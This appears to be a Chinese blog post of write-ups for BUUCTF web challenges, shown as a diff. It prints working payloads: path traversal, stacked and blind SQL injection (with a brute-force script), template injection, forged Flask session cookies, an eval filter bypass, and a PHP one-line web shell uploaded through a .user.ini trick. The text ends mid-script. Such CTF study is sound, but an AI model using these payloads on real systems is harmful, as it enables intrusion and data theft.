@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc="/>
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/code-line"></script><title>BUUCTF Web 部分题解（1）</title>
+</head>
+<body class="flex flex-col bg-gray-100">
+
+<div class="flex my-8 font-serif">
+    <div class="flex-auto w-1/3">
+        <div class="w-64 h-full mr-2 ml-auto">
+            <div class="mb-8"><div class="border rounded-lg shadow-md">
+    <div class="h-32 flex rounded-t-lg text-white" style="background-image: url('/images/background-1.jpg')">
+        <div class="m-auto">
+            <div class="text-center font-serif text-3xl my-2"><a href="/">Noth</a></div>
+            <div class="text-center font-serif">去码头整点薯条</div>
+        </div>
+    </div>
+    <nav class="rounded-b-lg bg-white">
+        <ul class="py-2 ml-8">
+            <li class="my-2 content-center">
+                <a href="/" class="hover:text-red-300"><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
+            </li>
+
+
+
+            <li class="my-2 content-center">
+                <a href="/metapages/archive/" class="hover:text-red-300"><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/categories/" class="hover:text-red-300"><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/tags/" class="hover:text-red-300"><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/metapages/link/" class="hover:text-red-300"><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/metapages/message/" class="hover:text-red-300"><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
+            </li>
+        </ul>
+    </nav>
+</div></div>
+            <div class="sticky top-2">
+                <div class="toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#warmup">WarmUp</a></li>
+    <li><a href="#随便注">随便注</a></li>
+    <li><a href="#easy_tornado">easy_tornado</a></li>
+    <li><a href="#easysql">EasySQL</a></li>
+    <li><a href="#admin">admin</a></li>
+    <li><a href="#easy-calc">Easy Calc</a></li>
+    <li><a href="#高明的黑客没做出来">高明的黑客（没做出来）</a></li>
+    <li><a href="#easysql-1">EasySQL</a></li>
+    <li><a href="#checkin">Checkin</a></li>
+    <li><a href="#havefun">Havefun</a></li>
+    <li><a href="#hackworld">HackWorld</a></li>
+    <li><a href="#secret-file">Secret File</a></li>
+    <li><a href="#fakebook">Fakebook</a></li>
+    <li><a href="#php">PHP</a></li>
+    <li><a href="#fake-google">fake google</a></li>
+    <li><a href="#knife">Knife</a></li>
+    <li><a href="#lovesql">LoveSQL</a></li>
+    <li><a href="#ssrf-me未完成">SSRF Me（未完成）</a></li>
+    <li><a href="#http">HTTP</a></li>
+    <li><a href="#easy-java未完成">Easy Java（未完成）</a></li>
+    <li><a href="#ping-ping-ping">Ping Ping Ping</a></li>
+    <li><a href="#nizhuangsiwei">NiZhuangSiWei</a></li>
+    <li><a href="#babysql">BabySQL</a></li>
+    <li><a href="#old-hack">old-hack</a></li>
+    <li><a href="#buyflag">BuyFlag</a></li>
+    <li><a href="#piapiapia">piapiapia</a></li>
+    <li><a href="#online-tool">Online Tool</a></li>
+    <li><a href="#include">Include</a></li>
+  </ul>
+</nav>
+</div>
+            </div>
+        </div>
+    </div>
+    <div class="flex-auto w-2/3">
+        <div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
+            <h1 class="font-serif text-4xl text-center mt-8 mb-2">BUUCTF Web 部分题解（1）</h1>
+            <div class="text-right text-gray-500 mr-20">
+                <span>
+                    Mar. 3, 2020 |
+                    <i class="far fa-bookmark"></i> 
+                </span>
+            </div>
+            <div class="content px-6 mb-8">
+                <p>Web小白，从0开始入门。</p>
+<h2 id="warmup">WarmUp</h2>
+<p>打开是一个滑稽的表情，直接源码发现有一个source.php，打开可以看到源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">emmm</span>
+    {
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkFile</span>(<span style="color:#f92672">&amp;</span>$page)
+        {
+            $whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;source&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;source.php&#34;</span>,<span style="color:#e6db74">&#34;hint&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;hint.php&#34;</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($page) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($page)) {
+                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you can&#39;t see it&#34;</span>;
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($page, $whitelist)) {
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+            }
+
+            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">mb_substr</span>(
+                $page,
+                <span style="color:#ae81ff">0</span>,
+                <span style="color:#a6e22e">mb_strpos</span>($page <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>)
+            );
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($_page, $whitelist)) {
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+            }
+
+            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($page);
+            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">mb_substr</span>(
+                $_page,
+                <span style="color:#ae81ff">0</span>,
+                <span style="color:#a6e22e">mb_strpos</span>($_page <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>)
+            );
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($_page, $whitelist)) {
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+            }
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you can&#39;t see it&#34;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+        }
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">emmm</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkFile</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+    ) {
+        <span style="color:#66d9ef">include</span> $_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>];
+        <span style="color:#66d9ef">exit</span>;
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&lt;img src=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /&gt;&#34;</span>;
+    }  
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>发现白名单中有source.php和hint.php,进入hint.php，提示flag在ffffllllaaaagggg。
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/03/WarmUp.png" alt="WarmUp">
+但是肯定不能直接访问，毕竟是白名单嘛。
+再看看源码，查一下这几个函数：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">isset():bool</td>
+<td style="text-align:left">检测变量是否已设置并且非 NULL</td>
+</tr>
+<tr>
+<td style="text-align:left">is_string( mixed $var) : bool</td>
+<td style="text-align:left">检测变量是否是字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool</td>
+<td style="text-align:left">检查数组中是否存在某个值</td>
+</tr>
+<tr>
+<td style="text-align:left">mb_substr( string $str, int $start[, int $length = NULL[, string $encoding = mb_internal_encoding()]] ) : string</td>
+<td style="text-align:left">获取部分字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">mb_strpos( string $haystack, string $needle[, int $offset = 0 [, string $encoding = mb_internal_encoding()]] ) : int</td>
+<td style="text-align:left">查找字符串在另一个字符串中首次出现的位置</td>
+</tr>
+<tr>
+<td style="text-align:left">urldecode( string $str) : string</td>
+<td style="text-align:left">解码已编码的 URL 字符串</td>
+</tr>
+</tbody>
+</table>
+<p>OK，代码现在可以看懂了。大概就说请求获取file，然后对file进行一定的检查，如果能通过会包含文件。现在也有文件了，那么就看怎么能绕过这个过滤了。
+过滤一共有三层，直接检查page，对page进行截断后检查，对page再解码之后再次截断之后进行检查，也就是一共进行三次检查。那么就要构造payload对<code>?</code>进行两次编码（url会自动解码一次）。
+然后这里还有一个知识点，就是目录穿透，最终穿透到根目录，所以最后构造的payload为：</p>
+<pre tabindex="0"><code>index.php?file=source.php%253f/../../../../ffffllllaaaagggg
+</code></pre><p>然后就能看到flag了。</p>
+<h2 id="随便注">随便注</h2>
+<p>题目直接说了是sql注入，那就尝试呗：直接输入1会返回数组，<code>1'</code>会报错，<code>1' #</code> ，那么肯定是存在注入点的，但是继续诸如的时候发现有过滤：</p>
+<pre tabindex="0"><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
+</code></pre><ul>
+<li>
+<p>preg_match ：执行匹配正则表达式
+几个数据库关键词被过滤了，没办法使用select，那么尝试使用其他语句，先查看一下当前的表：</p>
+<p>1'; show tables; #
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/03/easy_sql.png" alt="easy_sql">
+返回了两张表，看看表里面都有哪些字段：
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/03/word.png" alt="word">
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/03/1919810931114514.png" alt="1919810931114514">
+可以看到flag就在1919810931114514中，但是没办法读取他：但是我们可以分析出后台的查询语句应该是查询word表中的id，然后显示对应的data，那么我们就需要利用这个查询语句，用它来查询结果。但是查询word表已经是确定的了，所以我们需要修改表的名字：</p>
+</li>
+</ul>
+<pre tabindex="0"><code>payload = 1'; RENAME TABLE `words` TO `others`; RENAME TABLE `1919810931114514` TO `words`; Alter TABLE `words` CHANGE COLUMN `flag` `id` varchar(100); # 
+</code></pre><p>这个时候在查询就是查询原来的<code>1919810931114514</code>表了，那么只要构造一个查询<code>1' or 1 # </code>就可以返回flag了。</p>
+<h2 id="easy_tornado">easy_tornado</h2>
+<p>题目给了三个网页，告诉了flag的位置，hint是md5(cookie_secret+md5(filename))，然后会发现url的格式都问文件+hash，比如：</p>
+<ul>
+<li>
+<p>/hints.txt&amp;filehash=8a0e10bb3ad8684783a74647ff476e3c
+所以我们应该是要想办法构造出flag的hash。给出的提示是和cookie有关，但是并没有找到cookie。题目是tornado，先查询一下这时什么东西。</p>
+<p>Tornado is a Python web framework and asynchronous networking library, originally developed at FriendFeed. 
+也就是一个python的web框架，但是还是不会。参考其他大佬的WP，知道了这里是要使用模板注入：
+先随便输一个网页，然后发现error的msg是可控的，那么尝试模板注入：</p>
+<p>error?msg={{cookie_secret}}
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/03/easy_tornato.png" alt="easy_tornado">
+得到cookie_secret了，接着就可以构造payload了：</p>
+<p>file?filename=/fllllllllllllag&amp;filehash=09e7753541e2adcca4a42a84f1f879d9</p>
+</li>
+</ul>
+<h2 id="easysql">EasySQL</h2>
+<p>题目说是SQL注入，尝试之后发现其他语句可以直接执行，但是一旦包含flag就会返回nonono。
+还是没有办法，查看一下大佬的WP。好像原题是由源码泄露的，但是我这里没有扫出来，还有大佬直接推出查询语句，大概是这个思路：使用非0的数字查询的时候能正常返会，而其他则没有回显，因此猜测查询语句是有<code>||</code>连接的，所以查询语句可能是select 输入||内置的列名 表名；然后根据之前的查询结果推测查询语句应该是这样：</p>
+<pre><code>&quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;;
+</code></pre>
+<p>然后这里有两个解，第一种似乎是由于没有过滤*引起的非预期解，payload为：* ，1，构造的查询语句最终为：</p>
+<pre><code>select *,1 from Flag
+</code></pre>
+<p>预期解是使用的MySQL的sql_mode pipes_as_concat将||视为连接符，然后构造查询语句：</p>
+<pre><code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
+</code></pre>
+<h2 id="admin">admin</h2>
+<p>首先尝试是不是sql，发现没有注入点；除了直接登陆之外还有一个注册，先注册一个账号。
+登陆后可以在源码中提示登陆的不是admin，<code>change password</code>页面中发现可以找到源码是在github上：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span>
+</code></pre></div><p>基本上可以猜测这里是要想办法修改admin的密码，从而登录admin账户。
+直接修改密码时请求头中有一个cookie字段，根据源码使用的是flask框架，而且源码中的config.py中有以下内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Config</span>(object):    SECRET_KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;ckj123&#39;</span>    SQLALCHEMY_DATABASE_URI <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</code></pre></div><p>所以就是尝试伪造session了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#960050;background-color:#1e0010">$</span> python flask_session_cookie_manager3<span style="color:#f92672">.</span>py decode <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;.eJw9kEFrwkAQhf9KmbOHuEkPFTwom4YIM0vatTK5hNREk92sBdOiXfG_d7XgYXgwb-Z7zFyg2h3bsYPZrh7GdgJV38DsAk-fMAOltwnqtx69PZPIY_I0lPpjQL-OWaShV8TkaFAbTJRcxJSlZ9adVXLp0C_OqMOOIBPKkigHcpygyAVJjtlxxCadllngi5UjYz3KPEa5SG58kni65WG2DppHZYYJaRuY-0hleZgpfKlzz2b9S57ncJ3Adjzuqu8v2x4eJ6BII8z4GTfFCfXKKE2d0k2nNkVCprHsXgeSW09yaVinAbnq-DS_43pX79sHSduXd1X8O4faBQPqunH9ASbwM7bH--NgGsH1D1L2a9Y.XmW2sw.AEH1eAnUE3rIGcrKzuqr5WGTpb8&#34;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;{&#34;_fresh&#34;:false,&#34;_id&#34;:{&#34; b&#34;:&#34;OTc4MTRiMzkxN2I3NzNlZTVlMzU3Y2ExN2Q3NmNlOWM4ODA3NGExYThkODBmMzAxMTI3N2NjN2NkN2ZlNmY4M2I2NDY3YmY0YjE1ZGRiM2JmNjkzMDI3MDA4MzU3NDMwNzNlMGUwNzI0ZGM4NTkxMTg0OGI4MzQzZTIzYjUyNzY=&#34;},&#34;csrf_token&#34;:{&#34; b&#34;:&#34;M2E0MGY5MWQwMTJjOTNhOTdhOWQ4NjdkYmFlNDczNDBjYTEzZTJhYw==&#34;},&#34;image&#34;:{&#34; b&#34;:&#34;Tk9SOQ==&#34;},&#34;name&#34;:&#34;aadmin&#34;,&#34;user_id&#34;:&#34;10&#34;}&#39;</span>
+</code></pre></div><p>成功获取到了明文，其中有一个name字段为自己注册的名字，尝试更改后重新更改密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#960050;background-color:#1e0010">$</span> python flask_session_cookie_manager3<span style="color:#f92672">.</span>py encode <span style="color:#f92672">-</span>s <span style="color:#e6db74">&#34;ckj123&#34;</span> <span style="color:#f92672">-</span>t <span style="color:#e6db74">&#34;{&#39;_fresh&#39;:False,&#39;_id&#39;:&#39;97814b3917b773ee5e357ca17d76ce9c88074a1a8d80f3011277cc7cd7fe6f83b6467bf4b15ddb3bf69302700835743073e0e0724dc85911848b8343e23b5276&#39;,&#39;csrf_token&#39;:&#39;3a40f91d012c93a97a9d867dbae47340ca13e2ac&#39;,&#39;image&#39;:&#39;NOR9&#39;,&#39;name&#39;:&#39;admin&#39;,&#39;user_id&#39;:&#39;10&#39;}&#34;</span><span style="color:#f92672">.</span>eJwlj0FOxTAMBe<span style="color:#f92672">-</span>S9V_YsRs7_xAg_QtUTuxABS1SCyvE3QliOYt5mved1nHG9Zruw96vuKV183RPVRS5UUVpIhSxBC3SDcWl9KhdFYQNTV1hECBmkd6lu4woQ6kVLtIGN1zcG7VRKkEWAJ07TDA3IUAye9elIiprU2KKTG3JUtIt9esc6<span style="color:#f92672">-</span>fHWxyzh4xhVHTA3CtZFauuRbxZsBDDTJuu9eltu73EVJ6eH3XiYfsfme_bMfHrivP_IkL6<span style="color:#f92672">-</span>QUZDEZ0<span style="color:#f92672">.</span>XmW9kg<span style="color:#f92672">.</span>LaTTl6E8WTBDW6wmtLNt3g5TUz0
+</code></pre></div><p>拦截之后修改相应字段，返回的页面中就可以找到flag。
+<img src="http://ctf-qn.hufl.top//BUUCTF/03/04/admin.png" alt="admin"></p>
+<h2 id="easy-calc">Easy Calc</h2>
+<p>源码中提示<code>&lt;!--I've set up WAF to ensure security.--&gt;</code>，提示设置有WAF，可能是命令执行。然后给出了部分脚本，先看一下这个脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#calc&#39;</span>).<span style="color:#a6e22e">submit</span>(<span style="color:#66d9ef">function</span>(){        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;calc.php?num=&#34;</span><span style="color:#f92672">+</span>encodeURIComponent(<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#content&#34;</span>).<span style="color:#a6e22e">val</span>()),            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;GET&#39;</span>,            <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>){                <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#result&#34;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#e6db74">`&lt;div class=&#34;alert alert-success&#34;&gt;            &lt;strong&gt;答案:&lt;/strong&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">            &lt;/div&gt;`</span>);            },            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(){                <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;这啥?算不来!&#34;</span>);            }        })        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;    })<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>访问calc.php又可以获得源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phperror_reporting</span>(<span style="color:#ae81ff">0</span>);<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;num&#39;</span>])){    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);}<span style="color:#66d9ef">else</span>{        $str <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;num&#39;</span>];        $blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;\t&#39;</span>, <span style="color:#e6db74">&#39;\r&#39;</span>, <span style="color:#e6db74">&#39;\n&#39;</span>,<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>,<span style="color:#e6db74">&#39;\$&#39;</span>,<span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;\^&#39;</span>];        <span style="color:#66d9ef">foreach</span> ($blacklist <span style="color:#66d9ef">as</span> $blackitem) {                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $blackitem <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/m&#39;</span>, $str)) {                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;what are you want to do?&#34;</span>);                }        }        <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;echo &#39;</span><span style="color:#f92672">.</span>$str<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;;&#39;</span>);}<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>设置了黑名单过滤。可以看到最后有一个eval函数，那么很有可能就是想办法绕过过滤，实现命令执行。最麻烦的是连<code>/</code>都过滤了，那么应该考虑不能直接使用字符。所以这里使用<code>chr()</code>函数绕过。
+首先尝试一下phpinfo()，发现返回了 403.
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/calc.png" alt="calc"></p>
+<p>尝试在num加一个空格绕过：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/calc2.png" alt="calc2"></p>
+<p>成功执行，接下来尝试读取文件信息，使用chr()看能不能绕过<code>/calc.php?%20num=var_dump(scandir(chr(47)))</code>：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/calc3.png" alt="calc3"></p>
+<p>成功绕过过滤，并且返回中可以看到有一个 f1agg 文件，那么读取文件信息<code>/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/calc4.png" alt="clac4"></p>
+<h2 id="高明的黑客没做出来">高明的黑客（没做出来）</h2>
+<h2 id="easysql-1">EasySQL</h2>
+<p>又是一道 easysql，在这个比较简单，直接万能密码就出结果了。</p>
+<h2 id="checkin">Checkin</h2>
+<p>是个文件上传类型的题目，简单尝试之后测出有后缀名的检测、文件类型检测、以及<code>&lt;?</code>检测，因此绕过这些过滤之后可以上传一个<code>shell.jpg</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">GIF89a</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PHP&#34;</span><span style="color:#f92672">&gt;@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>]);<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</code></pre></div><p><img src="http://ctf-qn.hufl.top//BUUCTF/04/03/checkin.png" alt="checkin">
+返回了路径，但是时图片格式的所以没办法直接引用。这是考虑上传<code>.htacess</code>或<code>.user.ini</code>文件。
+可以看到上传的目录下除了上传文件外还有一个 index.php 文件，可以访问但没有任何信息，但是如果在这个目录下有.user.ini文件，并且含有：<code>auto_prepend_file=shell.jpg</code> 就可以包含我们的小马了：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/checkin2.png" alt="checkin2">
+成功上传。那就使用工具连接 index.php.</p>
+<h2 id="havefun">Havefun</h2>
+<p>查看网页源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        $cat<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;cat&#39;</span>];        <span style="color:#66d9ef">echo</span> $cat;        <span style="color:#66d9ef">if</span>($cat<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;dog&#39;</span>){            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Syc{cat_cat_cat_cat}&#39;</span>;        }
+</code></pre></div><p>直接使用 GET 方式上传一个 cat=dog 参数即可返回flag。</p>
+<h2 id="hackworld">HackWorld</h2>
+<p>告诉了我们 flag 在数据库中的位置，可能是sql注入。则是之后发现是盲注，并且过滤了很多符号，但是可以构造如下payload: <code>id=(ascii(substr((select(flag)from(flag)),1,1))&gt;0)</code>，于是写出脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requestsurl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://1e19e24e-1dc4-4995-b8c7-c93e49b52bfd.node3.buuoj.cn/index.php&#34;</span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;(ascii(substr((select(flag)from(flag)),</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">,1))&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)&#34;</span>passkey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Hello, glzjin wants a girlfriend.&#34;</span>flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">70</span>):	i_min<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>	i_max<span style="color:#f92672">=</span><span style="color:#ae81ff">122</span>	<span style="color:#66d9ef">while</span> abs(i_max<span style="color:#f92672">-</span>i_min)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1</span>:		mid<span style="color:#f92672">=</span>int((i_max<span style="color:#f92672">+</span>i_min)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)		p<span style="color:#f92672">=</span>payload <span style="color:#f92672">%</span> (str(i),str(mid))		p_data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>:p}		re <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,data<span style="color:#f92672">=</span>p_data)		<span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(passkey)<span style="color:#f92672">!=-</span><span style="color:#ae81ff">1</span>:			i_min <span style="color:#f92672">=</span> mid		<span style="color:#66d9ef">else</span>:			i_max <span style="color:#f92672">=</span> mid	<span style="color:#66d9ef">if</span> i_max<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:		<span style="color:#66d9ef">break</span>	flag<span style="color:#f92672">+=</span>chr(i_max)	print(<span style="color:#e6db74">&#34;flag:&#34;</span><span style="color:#f92672">+</span>flag)
